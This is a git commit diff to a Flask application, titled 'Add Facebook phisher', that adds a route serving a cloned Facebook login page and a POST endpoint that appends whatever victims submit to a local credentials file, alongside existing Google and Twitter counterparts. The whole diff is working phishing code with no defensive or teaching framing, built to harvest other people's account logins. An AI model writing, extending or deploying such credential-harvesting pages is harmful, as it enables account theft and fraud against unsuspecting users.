074cefb2261ab9d6d861ca885370ea2b3589e477
ErikBoesen <me@erikboesen.com>
2017-04-23 13:06:08 -0400

    Add Facebook phisher

--- app.py
+++ app.py
@@ -5,14 +5,19 @@ from os.path import expanduser
 app = Flask(__name__)
 
 
-@app.route('/google.com')
+@app.route('/google_client')
 def google_page():
     return render_template('google.com.html')
 
 
-@app.route('/twitter.com')
+@app.route('/twitter_client')
 def twitter_page():
     return render_template('twitter.com.html')
+
+
+@app.route('/facebook_client')
+def facebook_page():
+    return render_template('facebook.com.html')
 
 
 @app.route('/google_cred', methods=['POST'])
@@ -32,7 +37,16 @@ def twitter_store_cred():
 
     return ''
 
+@app.route('/facebook_cred', methods=['POST'])
+def facebook_store_cred():
+    data = request.data
+    with open(expanduser("~") + '/creds/facebook.txt', 'a') as f:
+        f.write(data.decode() + '\n')
+
+    return ''
+
+
 
 
 if __name__ == '__main__':
-    app.run(port=8023, debug=True)  # debug=False)
+    app.run(port=2023, debug=True)  # debug=False)
